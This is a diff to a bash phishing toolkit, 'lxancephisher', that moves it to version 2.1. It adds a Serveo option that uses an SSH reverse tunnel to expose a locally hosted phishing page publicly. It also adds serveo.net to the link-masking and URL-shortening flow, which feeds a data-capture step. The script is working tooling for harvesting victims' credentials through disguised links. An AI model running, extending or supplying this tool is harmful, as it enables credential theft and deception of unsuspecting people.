@@ -2,7 +2,7 @@
 
 ##   lxancephisher 	: 	Automated Phishing Tool
 ##   Author 		: 	Prince Katiyar
-##   Version 		: 	2.0
+##   Version 		: 	2.1
 ##   Github 		: 	https://github.com/LxaNce-Hacker/lxancephisher
 
 
@@ -79,7 +79,7 @@
 ##      Copyright (C) 2022 LXANCE-HACKER (https://github.com/LxaNce-Hacker)
 ##
 
-__version__="2.0"
+__version__="2.1"
 
 ## DEFAULT HOST & PORT 
 HOST='127.0.0.1'
@@ -191,9 +191,10 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${BLUE}░█░░█░█░█▀▀▄░█▀▀▄░█▀▄░█▀▀░░░▄▀▀▄░█░░░░░▀░░█▀▀░█░░░░█▀▀░█▀▀▄
-		${BLUE}░█░░▄▀▄░█▄▄█░█░▒█░█░░░█▀▀░░░█▄▄█░█▀▀█░░█▀░▀▀▄░█▀▀█░█▀▀░█▄▄▀
-		${BLUE}░▀▀░▀░▀░▀░░▀░▀░░▀░▀▀▀░▀▀▀░░░█░░░░▀░░▀░▀▀▀░▀▀▀░▀░░▀░▀▀▀░▀░▀▀
+		${BLUE}
+		${MAGENTA}▒█░░░ ▀▄▒▄▀ ░█▀▀█ ▒█▄░▒█ ▒█▀▀█ ▒█▀▀▀ 　 ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█
+		${MAGENTA}▒█░░░ ░▒█░░ ▒█▄▄█ ▒█▒█▒█ ▒█░░░ ▒█▀▀▀ 　 ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀
+		${MAGENTA}▒█▄▄█ ▄▀▒▀▄ ▒█░▒█ ▒█░░▀█ ▒█▄▄█ ▒█▄▄▄ 　 ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
 		${RED}          Version : ${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce-Hacker (Prince Katiyar)${WHITE}
@@ -204,9 +205,9 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${RED}░█░░█░█░█▀▀▄░█▀▀▄░█▀▄░█▀▀░░░▄▀▀▄░█░░░░░▀░░█▀▀░█░░░░█▀▀░█▀▀▄
-		${RED}░█░░▄▀▄░█▄▄█░█░▒█░█░░░█▀▀░░░█▄▄█░█▀▀█░░█▀░▀▀▄░█▀▀█░█▀▀░█▄▄▀
-		${RED}░▀▀░▀░▀░▀░░▀░▀░░▀░▀▀▀░▀▀▀░░░█░░░░▀░░▀░▀▀▀░▀▀▀░▀░░▀░▀▀▀░▀░▀▀
+		${RED}▒█░░░ ▀▄▒▄▀ ░█▀▀█ ▒█▄░▒█ ▒█▀▀█ ▒█▀▀▀ 　 ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█
+		${RED}▒█░░░ ░▒█░░ ▒█▄▄█ ▒█▒█▒█ ▒█░░░ ▒█▀▀▀ 　 ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀
+		${RED}▒█▄▄█ ▄▀▒▀▄ ▒█░▒█ ▒█░░▀█ ▒█▄▄█ ▒█▄▄▄ 　 ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
 		${WHITE}        Version : ${__version__}
 		
 	EOF
@@ -491,6 +492,36 @@ start_cloudflared() {
 	capture_data
 }
 
+start_serveo() {
+  rm .srv.log > /dev/null 2>&1 &
+  cusport
+  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+  { sleep 1; setup_site; }
+  echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Serveo..."
+
+  # Serveo Tunnel Start
+  if [[ `command -v ssh` ]]; then
+      if [[ $checkphp == *'php'* ]]; then
+		killall -2 php > /dev/null 2>&1
+		fi
+	if [[ $subdomain_resp == true ]]; then
+		$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:'$HOST':'$PORT' serveo.net  2> /dev/null > sendlink ' &
+		sleep 8
+	else
+		$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:'$HOST':'$PORT' serveo.net 2> /dev/null > sendlink ' &
+		sleep 8
+	fi
+	sleep 3
+	send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+	custom_url "$send_link"
+	capture_data
+
+  else
+    echo "SSH not found. Please install SSH to proceed."
+    return 1
+  fi
+}
+
 localxpose_auth() {
 	./.server/loclx -help > /dev/null 2>&1 &
 	sleep 1
@@ -550,7 +581,8 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}127.0.0.1${RED}]
 		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Account Needed${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} Serveo       ${RED}[${CYAN}Auto Detects${RED}]
+		${RED}[${WHITE}05${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
 
 	EOF
 
@@ -564,6 +596,8 @@ tunnel_menu() {
 		3 | 03)
 			start_cloudflared;;
 		4 | 04)
+			start_serveo;;
+		5 | 05)
 			start_loclx;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -628,7 +662,7 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|serveo.net|loclx.io) ]]; then
 		echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} URL matches allowed domains..."
 		if [[ $(site_stat $lxance) == 2* ]]; then
             shorten $lxance "$url"
